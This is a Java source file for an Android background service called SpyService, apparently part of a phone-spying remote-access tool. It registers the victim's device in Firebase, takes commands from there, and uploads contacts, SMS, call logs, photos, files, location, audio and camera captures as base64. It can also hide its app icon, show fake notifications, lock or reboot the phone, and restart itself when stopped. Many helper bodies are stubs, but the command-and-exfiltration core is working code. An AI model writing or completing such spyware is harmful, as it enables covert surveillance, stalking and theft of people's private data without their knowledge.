package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import com.google.firebase.database.*;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean foregroundStarted = false;

    // Firebase
    private FirebaseDatabase database;
    private DatabaseReference deviceRef;
    private DatabaseReference commandRef;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        startForegroundService();

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        FirebaseDatabase.getInstance().setPersistenceEnabled(false);
        database = FirebaseDatabase.getInstance();
        deviceRef = database.getReference("devices").child(deviceId);
        commandRef = database.getReference("commands").child(deviceId);

        registerDevice();
        listenForCommands();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
    }

    private void startForegroundService() { /* نفس الكود */ }
    private void updateNotification(String text) { /* نفس الكود */ }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());
            info.put("last_seen", System.currentTimeMillis());

            deviceRef.setValue(info.toString());
            updateNotification("✅ مسجل في Firebase");
            Log.d(TAG, "📤 Registered in Firebase");
        } catch (Exception e) {
            Log.e(TAG, "❌ Registration error", e);
        }
    }

    private void sendHeartbeat() {
        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
    }

    private void listenForCommands() {
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String command = dataSnapshot.getValue(String.class);
                if (command != null && !command.isEmpty()) {
                    Log.d(TAG, "📩 Command: " + command);
                    executeCommand(command);
                    commandRef.removeValue();
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "❌ Firebase listen error", error.toException());
            }
        });
    }

    private void sendData(String type, String data) {
        deviceRef.child("data").child(type).setValue(data);
    }

    private void sendFileToFirebase(File file, String caption) {
        try {
            byte[] bytes = new byte[(int) file.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            fis.read(bytes);
            fis.close();
            String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
            JSONObject json = new JSONObject();
            json.put("name", file.getName());
            json.put("data", base64);
            json.put("caption", caption);
            sendData("FILE", json.toString());
            file.delete();
        } catch (Exception e) {
            Log.e(TAG, "❌ Send file error", e);
        }
    }

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "⚡ Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": sendFileToFirebase(collectContacts(), "📇 جهات الاتصال"); break;
                case "get_sms": sendFileToFirebase(collectSms(), "💬 الرسائل النصية"); break;
                case "get_calllogs": sendFileToFirebase(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "get_location": getLocation(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "get_apps": sendFileToFirebase(collectApps(), "📱 التطبيقات"); break;
                case "get_photos": sendFileToFirebase(collectMedia("images"), "🖼 الصور"); break;
                case "get_videos": sendFileToFirebase(collectMedia("videos"), "🎬 الفيديوهات"); break;
                case "get_files": sendFileToFirebase(collectAllFiles(), "📦 الملفات"); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": showFakeNotification(); break;
                case "take_photo": takePhoto(); break;
                case "take_photo_front": takePhotoFront(); break;
                case "flash_on": flashOn(); break;
                case "flash_off": flashOff(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getPublicIp(); break;
                case "lock_device": lockDevice(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "get_accounts": getAccounts(); break;
                case "get_clipboard": getClipboard(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_network": getNetworkInfo(); break;
                case "start_location_track": startLocationTracking(); break;
                case "stop_location_track": stopLocationTracking(); break;
                default: sendData("ERROR", "أمر غير معروف: " + cmd);
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            Log.e(TAG, "❌ Execute error", e);
        }
    }

    // ======================================================================
    // دوال جمع البيانات (جميع الدوال السابقة)
    // ======================================================================
    private int getBatteryLevel() { /* نفس الكود */ return 100; }
    private File collectContacts() throws Exception { /* نفس الكود */ return new File(getCacheDir(), "contacts.txt"); }
    private File collectSms() throws Exception { /* نفس الكود */ return new File(getCacheDir(), "sms.txt"); }
    private File collectCallLogs() throws Exception { /* نفس الكود */ return new File(getCacheDir(), "call_log.txt"); }
    private File collectApps() throws Exception { /* نفس الكود */ return new File(getCacheDir(), "apps.txt"); }
    private File collectMedia(String type) throws Exception { /* نفس الكود */ return new File(getCacheDir(), type + ".zip"); }
    private File collectAllFiles() throws Exception { /* نفس الكود */ return new File(getCacheDir(), "all_files.zip"); }
    private void getLocation() { /* نفس الكود */ }
    private void startRecording() { /* نفس الكود */ }
    private void stopRecording() { /* نفس الكود */ }
    private void hideApp() { /* نفس الكود */ }
    private void showApp() { /* نفس الكود */ }
    private void showFakeNotification() { /* نفس الكود */ }
    private void takePhoto() { /* نفس الكود */ }
    private void takePhotoFront() { /* نفس الكود */ }
    private void flashOn() { /* نفس الكود */ }
    private void flashOff() { /* نفس الكود */ }
    private void getImei() { /* نفس الكود */ }
    private void getPhoneNumber() { /* نفس الكود */ }
    private void getSimInfo() { /* نفس الكود */ }
    private void getWifiInfo() { /* نفس الكود */ }
    private void getBatteryInfo() { /* نفس الكود */ }
    private void getPublicIp() { /* نفس الكود */ }
    private void startLocationTracking() { /* نفس الكود */ }
    private void stopLocationTracking() { /* نفس الكود */ }
    private void lockDevice() { /* نفس الكود */ }
    private void rebootDevice() { /* نفس الكود */ }
    private void shutdownDevice() { /* نفس الكود */ }
    private void getAccounts() { /* نفس الكود */ }
    private void getClipboard() { /* نفس الكود */ }
    private void getDeviceInfo() { /* نفس الكود */ }
    private void getNetworkInfo() { /* نفس الكود */ }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.release(); camera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        startService(new Intent(this, SpyService.class));
    }
}
